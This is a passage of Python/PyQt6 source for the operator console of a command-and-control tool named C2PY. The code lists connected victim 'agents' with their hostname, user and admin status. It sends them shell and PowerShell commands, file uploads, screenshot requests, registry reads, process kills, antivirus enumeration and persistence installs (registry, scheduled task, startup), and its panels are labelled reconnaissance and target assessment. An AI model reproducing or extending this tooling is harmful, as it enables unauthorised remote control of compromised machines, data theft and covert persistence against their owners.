        """Start listener with specific host/port - called from PayloadDialog"""
        if lhost:
            self.lhost_input.setText(lhost)
        if lport:
            self.lport_input.setText(str(lport))
        
        # Stop existing server if running
        if self.server_thread and self.server_thread.isRunning():
            self.stop_server()
            # Give it a moment to stop, then start with new config
            QTimer.singleShot(1000, self.start_server)
        else:
            self.start_server()
        
        # Log message for successful listener start
        self.log_message(f"🚀 Starting C2PY Listener on {lhost or self.lhost_input.text()}:{lport or self.lport_input.text()}")

    def stop_server(self):
        if self.server_thread:
            self.server_thread.stop()
            self.server_thread = None
        
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.lhost_input.setEnabled(True)
        self.lport_input.setEnabled(True)
        self.status_indicator.setText("● OFFLINE")
        self.status_indicator.setStyleSheet("color: #D9534F;")
        self.connection_status.setText("Disconnected")
        self.log_message("Enhanced C2 Server stopped")

    def log_message(self, message):
        """Log message with professional C2 terminal syntax highlighting"""
        # Apply professional terminal syntax highlighting
        formatted_message = self.apply_terminal_syntax_highlighting(message)
        
        # If the message already has a timestamp, don't add another one.
        if re.match(r'^\[\d{2}:\d{2}:\d{2}\]', message):
            self.log_browser.append(formatted_message)
        else:
            timestamp = datetime.now().strftime("%H:%M:%S")
            timestamp_html = f'<span style="color: #6b7280; font-family: JetBrains Mono;">[{timestamp}]</span>'
            self.log_browser.append(f'{timestamp_html} {formatted_message}')

    def apply_terminal_syntax_highlighting(self, text):
        """Apply traditional terminal syntax highlighting like in screenshots"""
        
        # Traditional color scheme like screenshots
        colors = {
            'success': '#00ff00',      # Classic green for success
            'error': '#ff4444',       # Red for errors
            'warning': '#ffaa00',     # Orange for warnings
            'info': '#00aaff',        # Blue for information
            'agent': '#aa55ff',       # Purple for agent connections
            'command': '#ffff00',     # Yellow for commands
            'output': '#ffffff',      # White for output
            'timestamp': '#888888',   # Gray for timestamps
            'ip': '#00aaff',          # Blue for IP addresses
            'port': '#00ff00',        # Green for ports
            'payload': '#ffaa00',     # Orange for payloads
            'encrypted': '#aa55ff'    # Purple for encryption
        }
        
        # Apply syntax highlighting patterns
        patterns = [
            # Timestamps
            (r'\[(\d{2}:\d{2}:\d{2})\]', f'<span style="color: {colors["timestamp"]};">[\\1]</span>'),
            
            # Success indicators
            (r'(✅|SUCCESS|Connected|listening|started|authenticated)', f'<span style="color: {colors["success"]}; font-weight: bold;">\\1</span>'),
            
            # Error indicators  
            (r'(❌|ERROR|Failed|Error|Exception)', f'<span style="color: {colors["error"]}; font-weight: bold;">\\1</span>'),
            
            # Warning indicators
            (r'(⚠️|WARNING|Warning|consider)', f'<span style="color: {colors["warning"]}; font-weight: bold;">\\1</span>'),
            
            # Agent connections
            (r'(🔍|Agent|agent|Client)', f'<span style="color: {colors["agent"]}; font-weight: bold;">\\1</span>'),
            
            # Commands
            (r'(Command sent|Command|cmd|powershell)', f'<span style="color: {colors["command"]}; font-weight: bold;">\\1</span>'),
            
            # IP addresses
            (r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', f'<span style="color: {colors["ip"]}; font-weight: bold;">\\1</span>'),
            
            # Ports
            (r'(:)(\d{2,5})', f'\\1<span style="color: {colors["port"]}; font-weight: bold;">\\2</span>'),
            
            # Payloads and encryption
            (r'(payload|encrypted|base64|Payload)', f'<span style="color: {colors["payload"]}; font-weight: bold;">\\1</span>'),
            
            # Encryption keywords
            (r'(XOR|encrypted|decrypted|authentication)', f'<span style="color: {colors["encrypted"]}; font-weight: bold;">\\1</span>'),
            
            # Info indicators
            (r'(Enhanced|Professional|Advanced)', f'<span style="color: {colors["info"]}; font-weight: bold;">\\1</span>')
        ]
        
        formatted_text = text
        
        # Apply all patterns
        for pattern, replacement in patterns:
            formatted_text = re.sub(pattern, replacement, formatted_text, flags=re.IGNORECASE)
        
        # Wrap in base styling
        return f'<span style="color: #ffffff; font-family: Consolas;">{formatted_text}</span>'

    def update_client_table(self):
        """Update client table with comprehensive agent information"""
        if not self.server_thread:
            self.client_table.setRowCount(0)
            self.agent_selector.clear()
            self.agent_count.setText("AGENTS: 0")
            return
            
        clients = self.server_thread.server.clients
        self.client_table.setRowCount(len(clients))
        self.agent_selector.clear()
        
        current_selection = self.active_agent_id
        self.agent_selector.blockSignals(True)

        admin_count = 0
        for row, (client_id, client_data) in enumerate(clients.items()):
            # ID
            id_item = QTableWidgetItem(str(client_id))
            id_item.setForeground(QColor("#58a6ff"))
            self.client_table.setItem(row, 0, id_item)
            
            # Address
            address_item = QTableWidgetItem(client_data['address'][0])
            address_item.setForeground(QColor("#3b82f6"))
            self.client_table.setItem(row, 1, address_item)
            
            info = client_data.get('info', {})
            
            # Hostname
            hostname = info.get('hostname', 'N/A')
            hostname_item = QTableWidgetItem(hostname)
            hostname_item.setForeground(QColor("#ffffff"))
            self.client_table.setItem(row, 2, hostname_item)
            
            # Username
            username = info.get('username', info.get('user', 'N/A'))
            username_item = QTableWidgetItem(username)
            username_item.setForeground(QColor("#c9d1d9"))
            self.client_table.setItem(row, 3, username_item)
            
            # Admin status with enhanced detection
            is_admin = info.get('elevated', info.get('is_admin', False))
            admin_text = "Yes" if is_admin else "No"
            admin_item = QTableWidgetItem(admin_text)
            if is_admin:
                admin_item.setForeground(QColor("#ff073a"))  # Red for admin (high privilege)
                admin_count += 1
            else:
                admin_item.setForeground(QColor("#ffb627"))  # Orange for non-admin
            self.client_table.setItem(row, 4, admin_item)

            # Status with agent type detection
            agent_info = client_data.get('agent_info', {})
            agent_type = agent_info.get('agent_type', 'unknown')
            stability = agent_info.get('stability', 'unknown')
            
            if agent_type == 'c2py_advanced_agent':
                status_text = f"🔗 Connected (Advanced)"
                status_color = QColor("#00ff41")  # Green for advanced agents
            elif agent_type in ['basic_powershell', 'basic_cmd']:
                status_text = f"⚠️ Connected (Basic)"
                status_color = QColor("#ffb627")  # Orange for basic shells
            else:
                status_text = "Connected"
                status_color = QColor("#00d4ff")  # Cyan for unknown
                
            status_item = QTableWidgetItem(status_text)
            status_item.setForeground(status_color)
            self.client_table.setItem(row, 5, status_item)

            # Last Seen
            last_seen_str = client_data['last_seen'].strftime("%m-%d %H:%M:%S")
            time_item = QTableWidgetItem(last_seen_str)
            time_item.setForeground(QColor("#6b7280"))
            self.client_table.setItem(row, 6, time_item)
            
            # Add to agent selector with enhanced labeling
            if agent_type == 'c2py_advanced_agent':
                selector_label = f"🔧 Agent {client_id} ({hostname}) - Advanced"
            elif is_admin:
                selector_label = f"👑 Agent {client_id} ({hostname}) - Admin"
            else:
                selector_label = f"📱 Agent {client_id} ({hostname})"
                
            self.agent_selector.addItem(selector_label, client_id)
        
        # Enhanced agent count with statistics
        total_agents = len(clients)
        self.agent_count.setText(f"AGENTS: {total_agents} | ADMIN: {admin_count}")
        
        # Restore selection
        if current_selection:
            index = self.agent_selector.findData(current_selection)
            if index != -1:
                self.agent_selector.setCurrentIndex(index)
        self.agent_selector.blockSignals(False)


    def select_agent(self):
        if self.agent_selector.currentData():
            self.active_agent_id = self.agent_selector.currentData()

    def send_command(self):
        """Enhanced command processing with support for all agent features"""
        if not self.active_agent_id:
            self.output_browser.append(f'<span style="color: #ff073a; font-weight: bold;">[✘] No agent selected</span>')
            return
            
        command = self.command_input.text().strip()
        if not command:
            return
        
        # Display command in terminal
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.output_browser.append(f'<span style="color: #6b7280;">[{timestamp}]</span> <span style="color: #58a6ff;">➤ {html.escape(command)}</span>')
        self.command_input.clear()
        
        # Process enhanced commands
        processed_command = self._process_enhanced_command(command)
        
        if self.server_thread:
            # Run command in a separate thread to avoid blocking the GUI
            threading.Thread(target=self._execute_command, args=(self.active_agent_id, processed_command), daemon=True).start()

    def _process_enhanced_command(self, command: str) -> str:
        """Process and enhance commands for advanced agent features"""
        
        # Convert command to lowercase for comparison
        cmd_lower = command.lower().strip()
        
        # Check if we have an active agent and its type
        if not self.server_thread or not hasattr(self.server_thread, 'server'):
            return command
        
        agent_info = {}
        if (hasattr(self.server_thread.server, 'clients') and 
            self.active_agent_id in self.server_thread.server.clients):
            agent_info = self.server_thread.server.clients[self.active_agent_id].get('agent_info', {})
        
        agent_type = agent_info.get('agent_type', 'basic_shell')
        
        # Only use JSON commands for advanced C2PY agents
        if agent_type != 'c2py_advanced_agent':
            # For basic shells, convert commands to appropriate equivalents
            if cmd_lower in ['sysinfo', 'systeminfo', 'info']:
                return 'systeminfo'  # Use Windows built-in command
            elif cmd_lower in ['hwinfo', 'hardware']:
                return 'wmic computersystem get model,manufacturer,totalphysicalmemory'
            elif cmd_lower in ['netinfo', 'network']:
                return 'ipconfig /all'
            elif cmd_lower in ['secinfo', 'security']:
                return 'wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName'
            elif cmd_lower in ['ps', 'processes']:
                return 'tasklist'
            elif cmd_lower in ['screenshot', 'screen', 'capture']:
                return 'echo Screenshot not supported for basic shells - use advanced agent'
            else:
                return command  # Send command as-is for basic shells
        
        # Enhanced command processing for C2PY agents only
        # System Information Commands
        if cmd_lower in ['sysinfo', 'systeminfo', 'info']:
            return json.dumps({'type': 'sysinfo', 'args': {'type': 'basic'}})
        elif cmd_lower in ['hwinfo', 'hardware']:
            return json.dumps({'type': 'sysinfo', 'args': {'type': 'hardware'}})
        elif cmd_lower in ['netinfo', 'network']:
            return json.dumps({'type': 'sysinfo', 'args': {'type': 'network'}})
        elif cmd_lower in ['secinfo', 'security']:
            return json.dumps({'type': 'sysinfo', 'args': {'type': 'security'}})
        
        # Process Management Commands
        elif cmd_lower in ['ps', 'processes', 'tasklist']:
            return json.dumps({'type': 'processes', 'args': {'action': 'list'}})
        elif cmd_lower.startswith('kill '):
            try:
                pid = int(cmd_lower.split()[1])
                return json.dumps({'type': 'processes', 'args': {'action': 'kill', 'pid': pid}})
            except (IndexError, ValueError):
                return f"Error: Invalid PID. Usage: kill <pid>"
        elif cmd_lower.startswith('procinfo '):
            try:
                pid = int(cmd_lower.split()[1])
                return json.dumps({'type': 'processes', 'args': {'action': 'info', 'pid': pid}})
            except (IndexError, ValueError):
                return f"Error: Invalid PID. Usage: procinfo <pid>"
        
        # File Operations Commands
        elif cmd_lower.startswith('ls ') or cmd_lower.startswith('dir '):
            path = command.split(' ', 1)[1] if ' ' in command else '.'
            return json.dumps({'type': 'file', 'args': {'action': 'list', 'path': path}})
        elif cmd_lower in ['ls', 'dir']:
            return json.dumps({'type': 'file', 'args': {'action': 'list', 'path': '.'}})
        elif cmd_lower.startswith('upload '):
            parts = command.split(' ', 2)
            if len(parts) >= 2:
                local_path = parts[1]
                remote_path = parts[2] if len(parts) > 2 else os.path.basename(local_path)
                return json.dumps({'type': 'file', 'args': {'action': 'upload', 'local_path': local_path, 'remote_path': remote_path}})
            else:
                return "Error: Usage: upload <local_path> [remote_path]"
        
        # Registry Commands (Windows)
        elif cmd_lower.startswith('reg read '):
            parts = command.split(' ', 3)
            if len(parts) >= 3:
                hive = parts[2]
                path = parts[3] if len(parts) > 3 else ""
                return json.dumps({'type': 'registry', 'args': {'action': 'read', 'hive': hive, 'path': path}})
            else:
                return "Error: Usage: reg read <hive> <path> [value_name]"
        elif cmd_lower.startswith('reg list '):
            parts = command.split(' ', 3)
            if len(parts) >= 3:
                hive = parts[2]
                path = parts[3] if len(parts) > 3 else ""
                return json.dumps({'type': 'registry', 'args': {'action': 'list', 'hive': hive, 'path': path}})
            else:
                return "Error: Usage: reg list <hive> <path>"
        
        # Persistence Commands
        elif cmd_lower in ['persist', 'persistence']:
            return json.dumps({'type': 'persistence', 'args': {'action': 'install', 'method': 'all'}})
        elif cmd_lower.startswith('persist '):
            method = cmd_lower.split()[1]
            if method in ['registry', 'task', 'startup']:
                return json.dumps({'type': 'persistence', 'args': {'action': 'install', 'method': method}})
            else:
                return "Error: Valid methods: registry, task, startup, all"
        
        # Screenshot Command
        elif cmd_lower in ['screenshot', 'screen', 'capture']:
            return json.dumps({'type': 'screenshot'})
        
        # PowerShell Commands
        elif cmd_lower.startswith('ps ') or cmd_lower.startswith('powershell '):
            ps_command = command.split(' ', 1)[1]
            return json.dumps({'type': 'powershell', 'args': {'command': ps_command}})
        
        # Command History
        elif cmd_lower in ['history', 'hist']:
            return json.dumps({'type': 'history'})
        
        # Help Command
        elif cmd_lower in ['help', '?']:
            return self._get_help_text()
        
        # Default: treat as shell command
        else:
            return json.dumps({'type': 'shell', 'args': {'command': command}})

    def _get_help_text(self) -> str:
        """Return help text for available commands"""
        help_text = """
🔧 C2PY ADVANCED AGENT COMMANDS

📊 SYSTEM INFORMATION:
  sysinfo, info       - Basic system information
  hwinfo, hardware    - Hardware details (CPU, memory, disks)
  netinfo, network    - Network interfaces and connections
  secinfo, security   - Security software and settings

⚙️ PROCESS MANAGEMENT:
  ps, processes       - List all running processes
  kill <pid>         - Terminate process by PID
  procinfo <pid>     - Detailed process information

📁 FILE OPERATIONS:
  ls, dir [path]     - List directory contents
  upload <local> [remote] - Upload file to agent

🔑 REGISTRY ACCESS (Windows):
  reg read <hive> <path>  - Read registry key/value
  reg list <hive> <path>  - List registry subkeys

🔒 PERSISTENCE:
  persist            - Install all persistence methods
  persist <method>   - Install specific method (registry/task/startup)

📷 UTILITIES:
  screenshot         - Capture desktop screenshot
  ps <command>       - Execute PowerShell command
  history           - Show command history

💡 EXAMPLES:
  sysinfo
  ps
  kill 1234
  ls C:\\
  reg read HKEY_CURRENT_USER SOFTWARE
  persist registry
  screenshot
  ps Get-Process
        """
        return help_text

    def _execute_command(self, agent_id, command):
        try:
            response = self.server_thread.server.send_command(agent_id, command)
            # Use signal to update GUI from this thread
            self.server_thread.command_response.emit(agent_id, response)
        except Exception as e:
            error_msg = f"Failed to send command: {e}"
            self.server_thread.command_response.emit(agent_id, error_msg)

    def handle_command_response(self, client_id, response):
        """Handle command response with improved formatting and error detection"""
        
        # Check for screenshot response
        if response.startswith("SCREENSHOT_DATA:"):
            self.handle_screenshot_response(response)
            return
        
        # Check if response contains decryption errors
        if "[Decryption Error:" in response or "[Processing Error:" in response:
            # Extract and format error information
            error_lines = response.split('\n')
            error_msg = ""
            readable_content = ""
            
            for line in error_lines:
                if line.startswith("[") and ("Error:" in line):
                    error_msg = line
                elif not line.startswith("["):
                    readable_content += line + "\n"
            
            # Format the error display
            formatted_response = f"""<div style="font-family: 'JetBrains Mono', Consolas, monospace;">
<span style="color: #ff073a; font-weight: bold;">⚠️ RESPONSE PROCESSING ERROR</span><br>
<span style="color: #ffb627;">{error_msg}</span><br><br>
<span style="color: #c9d1d9; font-weight: bold;">Raw Content:</span><br>
<span style="color: #ffffff; background-color: #1e1e1e; padding: 8px; display: block;">{html.escape(readable_content.strip())}</span>
</div>"""
        else:
            # Normal response formatting
            formatted_response = self.format_terminal_output(response)
        
        self.output_browser.append(formatted_response)
        self.output_browser.verticalScrollBar().setValue(self.output_browser.verticalScrollBar().maximum())

    def handle_screenshot_response(self, response):
        """Handle screenshot response and display image"""
        try:
            # Extract screenshot data
            if not response.startswith("SCREENSHOT_DATA:"):
                return
            
            # Parse screenshot response format: SCREENSHOT_DATA:filename:base64_data
            parts = response.split(":", 2)
            if len(parts) != 3:
                self.output_browser.append(f'<span style="color: #ff073a;">❌ Invalid screenshot format</span>')
                return
                
            filename = parts[1]
            screenshot_data = parts[2]
            
            # Decode base64 image data
            import base64
            image_bytes = base64.b64decode(screenshot_data)
            
            # Save screenshot to screenshots directory
            os.makedirs("screenshots", exist_ok=True)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            screenshot_path = f"screenshots/screenshot_{self.active_agent_id}_{timestamp}.png"
            
            with open(screenshot_path, "wb") as f:
                f.write(image_bytes)
            
            # Display success message with image info
            file_size = len(image_bytes) / 1024  # KB
            success_msg = f"""<div style="font-family: 'JetBrains Mono', Consolas, monospace; margin: 10px 0;">
<span style="color: #00ff00; font-weight: bold;">📸 SCREENSHOT CAPTURED</span><br>
<span style="color: #c9d1d9;">📁 File: {screenshot_path}</span><br>
<span style="color: #c9d1d9;">📏 Size: {file_size:.1f} KB</span><br>
<span style="color: #c9d1d9;">🕒 Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</span><br>
<br>
<span style="color: #58a6ff; text-decoration: underline; cursor: pointer;" onclick="window.open('{os.path.abspath(screenshot_path)}')">🖼️ Click to view screenshot</span>
</div>"""
            
            self.output_browser.append(success_msg)
            
            # Show screenshot in separate window
            self.show_screenshot_window(screenshot_path)
            
        except Exception as e:
            error_msg = f'<span style="color: #ff073a;">❌ Screenshot processing error: {str(e)}</span>'
            self.output_browser.append(error_msg)

    def show_screenshot_window(self, screenshot_path):
        """Display screenshot in a separate window"""
        try:
            from PyQt6.QtWidgets import QDialog, QVBoxLayout, QLabel, QScrollArea, QPushButton, QHBoxLayout
            from PyQt6.QtGui import QPixmap
            from PyQt6.QtCore import Qt
            
            # Create screenshot dialog
            dialog = QDialog(self)
            dialog.setWindowTitle(f"Screenshot - Agent {self.active_agent_id}")
            dialog.setMinimumSize(800, 600)
            dialog.setStyleSheet("""
                QDialog {
                    background-color: #1e1e1e;
                    color: #c9d1d9;
                }
                QPushButton {
                    background-color: #21262d;
                    border: 1px solid #30363d;
                    color: #c9d1d9;
                    padding: 8px 16px;
                    font-weight: 600;
                }
                QPushButton:hover {
                    background-color: #30363d;
                    border-color: #58a6ff;
                }
            """)
            
            layout = QVBoxLayout(dialog)
            
            # Screenshot display area
            scroll_area = QScrollArea()
            scroll_area.setWidgetResizable(True)
            scroll_area.setStyleSheet("QScrollArea { border: 1px solid #30363d; }")
            
            image_label = QLabel()
            pixmap = QPixmap(screenshot_path)
            
            # Scale image if too large
            if pixmap.width() > 1200 or pixmap.height() > 800:
                pixmap = pixmap.scaled(1200, 800, Qt.AspectRatioMode.KeepAspectRatio, Qt.TransformationMode.SmoothTransformation)
            
            image_label.setPixmap(pixmap)
            image_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
            scroll_area.setWidget(image_label)
            
            # Button layout
            button_layout = QHBoxLayout()
            
            save_button = QPushButton("💾 Save As...")
            save_button.clicked.connect(lambda: self.save_screenshot_as(screenshot_path))
            
            close_button = QPushButton("❌ Close")
            close_button.clicked.connect(dialog.close)
            
            button_layout.addWidget(save_button)
            button_layout.addStretch()
            button_layout.addWidget(close_button)
            
            layout.addWidget(scroll_area)
            layout.addLayout(button_layout)
            
            dialog.exec()
            
        except Exception as e:
            error_msg = f'<span style="color: #ff073a;">❌ Cannot display screenshot: {str(e)}</span>'
            self.output_browser.append(error_msg)

    def save_screenshot_as(self, source_path):
        """Save screenshot to user-specified location"""
        try:
            from PyQt6.QtWidgets import QFileDialog
            
            filename, _ = QFileDialog.getSaveFileName(
                self,
                "Save Screenshot",
                f"screenshot_{self.active_agent_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png",
                "PNG Images (*.png);;All Files (*)"
            )
            
            if filename:
                import shutil
                shutil.copy2(source_path, filename)
                self.output_browser.append(f'<span style="color: #00ff00;">💾 Screenshot saved to: {filename}</span>')
                
        except Exception as e:
            error_msg = f'<span style="color: #ff073a;">❌ Save error: {str(e)}</span>'
            self.output_browser.append(error_msg)


    def format_terminal_output(self, command_response):
        """Traditional terminal output formatter matching screenshots style"""
        try:
            # Sanitize and escape HTML special characters
            response_text = html.escape(command_response.strip())
            
            if not response_text:
                return f'<span style="color: #888888; font-style: italic; font-family: Consolas;">[EMPTY RESPONSE]</span>'

            lines = response_text.split('\n')
            formatted_lines = []

            # Traditional color scheme like screenshots
            colors = {
                'error': '#ff4444',       # Red for errors
                'success': '#00ff00',     # Green for success  
                'warning': '#ffaa00',     # Orange for warnings
                'info': '#00aaff',        # Blue for info
                'path': '#00aaff',        # Blue for paths
                'process': '#aa55ff',     # Purple for processes
                'network': '#00ff00',     # Green for network
                'file': '#ffaa00',        # Orange for files
                'header': '#ffffff',      # White for headers
                'separator': '#888888',   # Gray for separators
                'default': '#ffffff'      # White for default text
            }

            for line in lines:
                line = line.strip()
                if not line:
                    formatted_lines.append('')
                    continue

                # Traditional terminal syntax highlighting
                if any(keyword in line.lower() for keyword in ['error', 'failed', 'access denied', 'not found', 'exception', 'denied']):
                    formatted_lines.append(f'<span style="color: {colors["error"]}; font-weight: bold; font-family: Consolas;">[✘] {line}</span>')
                elif any(keyword in line.lower() for keyword in ['success', 'completed', 'ok', 'done', 'created', 'generated', 'connected', 'uploaded']):
                    formatted_lines.append(f'<span style="color: {colors["success"]}; font-weight: bold; font-family: Consolas;">[✔] {line}</span>')
                elif any(keyword in line.lower() for keyword in ['warning', 'caution', 'note', 'attention']):
                    formatted_lines.append(f'<span style="color: {colors["warning"]}; font-weight: bold; font-family: Consolas;">[!] {line}</span>')
                elif line.startswith('C:') or line.startswith('/') or '\\' in line or line.startswith('./'):
                    # Path-like strings
                    formatted_lines.append(f'<span style="color: {colors["path"]}; font-family: Consolas;">{line}</span>')
                elif any(word in line.lower() for word in ['directory', 'file', 'folder', 'kb', 'mb', 'gb', 'bytes']):
                    # File system related
                    formatted_lines.append(f'<span style="color: {colors["file"]}; font-family: Consolas;">{line}</span>')
                elif any(word in line.lower() for word in ['pid', 'process', 'service', 'task', 'thread']):
                    # Process related
                    formatted_lines.append(f'<span style="color: {colors["process"]}; font-family: Consolas;">{line}</span>')
                elif any(word in line.lower() for word in ['ip', 'port', 'tcp', 'udp', 'http', 'https', 'connection']):
                    # Network related
                    formatted_lines.append(f'<span style="color: {colors["network"]}; font-family: Consolas;">{line}</span>')
                elif any(header in line for header in ['Name', 'PID', 'CPU', 'Memory', 'Path', 'Status', 'Size', 'Date', 'Type']):
                    # Table headers
                    formatted_lines.append(f'<span style="color: {colors["header"]}; font-weight: bold; font-family: Consolas;">{line}</span>')
                elif line.startswith(('---', '===', '___', '***', '###')):
                    # Separators
                    formatted_lines.append(f'<span style="color: {colors["separator"]}; font-family: Consolas;">{line}</span>')
                elif line.startswith(('>', '$', '#', 'PS ')):
                    # Command prompts
                    formatted_lines.append(f'<span style="color: {colors["info"]}; font-weight: bold; font-family: Consolas;">{line}</span>')
                else:
                    # Default text
                    formatted_lines.append(f'<span style="color: {colors["default"]}; font-family: Consolas;">{line}</span>')
            
            return '<br>'.join(formatted_lines)

        except Exception as e:
            return f'<span style="color: #ff4444; font-weight: bold; font-family: Consolas;">[FORMATTING ERROR] {html.escape(str(e))}</span>'

    def show_agent_context_menu(self, position):
        """Show context menu for agent management"""
        item = self.client_table.itemAt(position)
        if item is None:
            return
            
        row = item.row()
        if row < 0:
            return
            
        # Get agent ID from the first column
        agent_id_item = self.client_table.item(row, 0)
        if not agent_id_item:
            return
            
        agent_id = int(agent_id_item.text())
        
        # Create context menu
        context_menu = QMenu(self)
        context_menu.setStyleSheet("""
            QMenu {
                background-color: #161b22;
                border: 1px solid #30363d;
                border-radius: 0px;
                color: #c9d1d9;
                font-family: 'JetBrains Mono', monospace;
                font-size: 11px;
                padding: 4px;
            }
            QMenu::item {
                padding: 8px 16px;
                border-radius: 0px;
            }
            QMenu::item:selected {
                background-color: #1f6feb;
                color: #ffffff;
            }
            QMenu::separator {
                height: 1px;
                background-color: #30363d;
                margin: 4px 0px;
            }
        """)
        
        # Add menu actions
        if self.server_thread and agent_id in self.server_thread.server.clients:
            client_info = self.server_thread.server.clients[agent_id]
            
            # Agent information
            info_action = context_menu.addAction("📊 Show Agent Details")
            info_action.triggered.connect(lambda: self.show_agent_details(agent_id))
            
            # System commands
            context_menu.addSeparator()
            sysinfo_action = context_menu.addAction("💻 Get System Info")
            sysinfo_action.triggered.connect(lambda: self.send_agent_command(agent_id, "sysinfo"))
            
            processes_action = context_menu.addAction("🔧 List Processes")
            processes_action.triggered.connect(lambda: self.send_agent_command(agent_id, "tasklist"))
            
            netstat_action = context_menu.addAction("🌐 Network Connections")
            netstat_action.triggered.connect(lambda: self.send_agent_command(agent_id, "netstat -an"))
            
            # File operations
            context_menu.addSeparator()
            pwd_action = context_menu.addAction("📁 Current Directory")
            pwd_action.triggered.connect(lambda: self.send_agent_command(agent_id, "pwd"))
            
            ls_action = context_menu.addAction("📋 List Files")
            ls_action.triggered.connect(lambda: self.send_agent_command(agent_id, "dir"))
            
            # Agent management
            context_menu.addSeparator()
            disconnect_action = context_menu.addAction("❌ Disconnect Agent")
            disconnect_action.triggered.connect(lambda: self.disconnect_agent(agent_id))
            
        else:
            # Agent not available
            unavailable_action = context_menu.addAction("⚠️ Agent Unavailable")
            unavailable_action.setEnabled(False)
        
        # Show context menu
        context_menu.exec(self.client_table.mapToGlobal(position))

    def show_agent_details(self, agent_id):
        """Show detailed agent information"""
        if not self.server_thread or agent_id not in self.server_thread.server.clients:
            QMessageBox.warning(self, "Agent Details", "Agent not found or disconnected")
            return
            
        client_info = self.server_thread.server.clients[agent_id]
        agent_info = client_info.get('agent_info', {})
        system_info = client_info.get('info', {})
        
        # Create details dialog
        dialog = QDialog(self)
        dialog.setWindowTitle(f"Agent {agent_id} - Detailed Information")
        dialog.resize(800, 600)
        dialog.setStyleSheet("""
            QDialog {
                background-color: #0d1117;
                color: #c9d1d9;
                font-family: 'JetBrains Mono', monospace;
            }
            QTextEdit {
                background-color: #000000;
                border: 1px solid #30363d;
                color: #ffffff;
                font-family: 'JetBrains Mono', monospace;
                font-size: 11px;
                padding: 12px;
            }
            QPushButton {
                background-color: #21262d;
                border: 1px solid #30363d;
                color: #c9d1d9;
                padding: 8px 16px;
                font-weight: 600;
                text-transform: uppercase;
            }
            QPushButton:hover {
                background-color: #30363d;
                border-color: #58a6ff;
            }
        """)
        
        layout = QVBoxLayout(dialog)
        
        # Agent details text
        details_text = QTextEdit()
        details_text.setReadOnly(True)
        
        # Format agent information
        details = f"""
╔══════════════════════════════════════════════════════════════════════════════════════╗
║                            AGENT {agent_id} - DETAILED RECONNAISSANCE                           ║
╠══════════════════════════════════════════════════════════════════════════════════════╣

🔍 CONNECTION INFORMATION:
   ├─ Agent ID: {agent_id}
   ├─ Address: {client_info.get('address', ['Unknown', 'Unknown'])[0]}:{client_info.get('address', ['Unknown', 'Unknown'])[1]}
   ├─ Status: {client_info.get('status', 'Unknown')}
   ├─ Last Seen: {client_info.get('last_seen', 'Unknown')}
   ├─ Agent Type: {agent_info.get('agent_type', 'Unknown')}
   ├─ Stability: {agent_info.get('stability', 'Unknown')}
   └─ Encryption: {agent_info.get('encryption', 'Unknown')}

"""
        
        # Handle system_info parsing
        parsed_system_info = {}
        if isinstance(system_info, str):
            try:
                # Try to parse JSON string
                parsed_system_info = json.loads(system_info)
            except:
                # If parsing fails, create basic info from string
                parsed_system_info = {'raw_info': system_info}
        elif isinstance(system_info, dict):
            parsed_system_info = system_info
        
        if isinstance(parsed_system_info, dict) and 'hostname' in parsed_system_info:
            # Advanced agent with full system info
            details += f"""
💻 SYSTEM IDENTIFICATION:
   ├─ Hostname: {parsed_system_info.get('hostname', 'Unknown')}
   ├─ Username: {parsed_system_info.get('username', 'Unknown')}
   ├─ Domain: {parsed_system_info.get('domain', 'Unknown')}
   └─ Agent UUID: {parsed_system_info.get('agent_id', 'Unknown')}

🖥️ OPERATING SYSTEM:
   ├─ OS Name: {parsed_system_info.get('os', {}).get('name', 'Unknown')}
   ├─ Version: {parsed_system_info.get('os', {}).get('version', 'Unknown')}
   ├─ Release: {parsed_system_info.get('os', {}).get('release', 'Unknown')}
   ├─ Build: {parsed_system_info.get('os', {}).get('build', 'Unknown')}
   ├─ Edition: {parsed_system_info.get('os', {}).get('edition', 'Unknown')}
   ├─ Architecture: {parsed_system_info.get('os', {}).get('architecture', 'Unknown')}
   ├─ Machine: {parsed_system_info.get('os', {}).get('machine', 'Unknown')}
   └─ Processor: {parsed_system_info.get('os', {}).get('processor', 'Unknown')}

🔒 SECURITY CONTEXT:
   ├─ Elevated Privileges: {parsed_system_info.get('security', {}).get('elevated', 'Unknown')}
   ├─ UAC Status: {parsed_system_info.get('security', {}).get('uac_enabled', 'Unknown')}
   ├─ Antivirus: {', '.join(parsed_system_info.get('security', {}).get('antivirus', ['Unknown']))}
   ├─ Windows Defender: {parsed_system_info.get('security', {}).get('defender_status', 'Unknown')}
   └─ Firewall: {parsed_system_info.get('security', {}).get('firewall_status', 'Unknown')}

🌐 NETWORK CONFIGURATION:
   ├─ Primary IP: {parsed_system_info.get('network', {}).get('ip_address', 'Unknown')}
   ├─ MAC Address: {parsed_system_info.get('network', {}).get('mac_address', 'Unknown')}
   └─ Interfaces: {str(parsed_system_info.get('network', {}).get('interfaces', 'Unknown'))[:200]}...

⚙️ HARDWARE INFORMATION:
   ├─ CPU Cores: {parsed_system_info.get('hardware', {}).get('cpu_count', 'Unknown')}
   ├─ Total Memory: {parsed_system_info.get('hardware', {}).get('total_memory', 'Unknown')}
   └─ Disk Info: {str(parsed_system_info.get('hardware', {}).get('disk_info', 'Unknown'))[:200]}...

🌍 ENVIRONMENT:
   ├─ Python Version: {parsed_system_info.get('environment', {}).get('python_version', 'Unknown')}
   ├─ Current Directory: {parsed_system_info.get('environment', {}).get('current_dir', 'Unknown')}
   ├─ Timezone: {parsed_system_info.get('environment', {}).get('timezone', 'Unknown')}
   └─ PATH: {str(parsed_system_info.get('environment', {}).get('path_env', 'Unknown'))[:100]}...

🎯 TARGET ASSESSMENT:
   ├─ Target Type: {parsed_system_info.get('target_type', 'Unknown')}
   ├─ Criticality: {parsed_system_info.get('criticality', 'Unknown')}
   └─ Geolocation: {parsed_system_info.get('geolocation', 'Unknown')}

🔧 CAPABILITIES:
   └─ Available: {', '.join(agent_info.get('capabilities', ['Basic Command Execution']))}

📋 RECOMMENDATIONS:
   └─ {agent_info.get('recommendation', 'Continue monitoring for enhanced capabilities')}

╚══════════════════════════════════════════════════════════════════════════════════════╝
"""
        else:
